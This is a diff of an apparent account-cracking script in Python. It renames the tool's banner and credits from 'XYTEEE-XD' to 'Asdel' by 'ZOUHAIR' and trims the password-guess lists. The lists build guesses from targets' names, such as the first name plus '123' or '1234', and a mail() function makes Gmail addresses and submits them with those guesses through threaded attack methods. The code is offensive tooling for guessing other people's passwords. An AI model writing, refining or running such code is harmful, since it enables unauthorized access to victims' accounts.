@@ -480,21 +480,16 @@ mtd,cp_xdx,cokix=[],[],[]
 def clear():
  os.system('clear')
 #---------------------[Banner]---------------------#
-def xyteee():
+def Asdel():
     #os.system('clear')
     print(f"""\x1b[1;97m
 
- ▐▄\x1b[0;91m•\x1b[0;97m ▄  ▄\x1b[0;91m·\x1b[0;97m ▄▌▄▄▄▄▄▄▄▄ \x1b[0;91m.\x1b[0;97m▄▄▄ \x1b[0;91m.\x1b[0;97m▄▄▄ \x1b[0;91m.\x1b[0;97m
-  █▌█▌\x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m▪\x1b[0;97m██▌\x1b[0;91m•\x1b[0;97m██  ▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m
-  \x1b[0;91m·\x1b[0;97m██\x1b[0;91m·\x1b[0;97m ▐█▌▐█\x1b[0;91m▪\x1b[0;97m ▐█\x1b[0;91m.▪\x1b[0;97m▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄
- \x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m·\x1b[0;97m█▌ ▐█▀\x1b[0;91m·.\x1b[0;97m ▐█▌\x1b[0;91m·\x1b[0;97m▐█▄▄▌▐█▄▄▌▐█▄▄▌ \x1b[1;91m•\033[93m•\x1b[1;92m•\x1b[1;97m
- \x1b[0;91m•\x1b[0;97m▀▀ ▀▀  ▀ \x1b[0;91m•\x1b[0;97m  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ \033[1;31m\033[1;47mversion\033[0;0m\x1b[1;30m 1.1.1 \x1b[1;30m
-\033[38;3;276;131;0;1m-----------------------------------------------------
- Author   : XYTEEE-XD
- Telegram : t.me/xyteee
- Tools    : \x1b[38;5;208mXYTEEE-XC\x1b[1;97m
- Status   : \x1b[38;5;42mPremium\x1b[1;97m
------------------------------------------------------""")
+ 🇦​​​​​🇸​​​​​🇩​​​​​🇪​​​​​🇱​​​​​version\033[0;0m\x1b[1;30m Ultra \x1b[1;30m
+\033[38;3;276;131;0;1m---------------------------------------------
+ Author   : \x1b[38;5;208mZOUHAIR\x1b[1;97m
+ Tools    : \x1b[38;5;208mAsdel\x1b[1;97m
+ Status   : \x1b[38;5;208mPersonnel\x1b[1;97m
+-------------------------------------------""")
 #---------------------[Main-Menu]---------------------#
 def rmain():
     clear();xyteee()
@@ -581,10 +576,10 @@ def p4():
             if len(nmf)<6:
                 if len(frs)<3:
                     pass
-                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'1122');pwv.append(frs+'@123');pwv.append(nmf+'123');pwv.append(nmf+'@123');pwv.append(nmf+'1234')
+                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(nmf+'1234')
             else:
                 if len(frs)<3:pwv.append(nmf)
-                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'1122');pwv.append(frs+'@123');pwv.append(nmf+'123');pwv.append(nmf+'@123');pwv.append(nmf+'1234')
+                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'123456');pwv.append(frs+'12345')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:pwv.append(xpwd)
             else:pass
@@ -735,7 +730,7 @@ def mail():
         os.system("clear");xyteee();print(f'{P} Gmail Name : {tk[:4]}***{domain}');print(f' Total Ids : '+idx);print(led)
         for number in idf:
             idf = first+'.'+last+number+domain
-            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
+            pwv= [first+last,first+' '+last,last,first+number,first+'123',first+'1234',first+last+'12'] 
             if mthd in ['1','01']:xyteee_xd.submit(md1,idf,pwv)
             elif mthd in ['2','02']:xyteee_xd.submit(md2,idf,pwv)
             elif mthd in ['3','03']:xyteee_xd.submit(md3,idf,pwv)
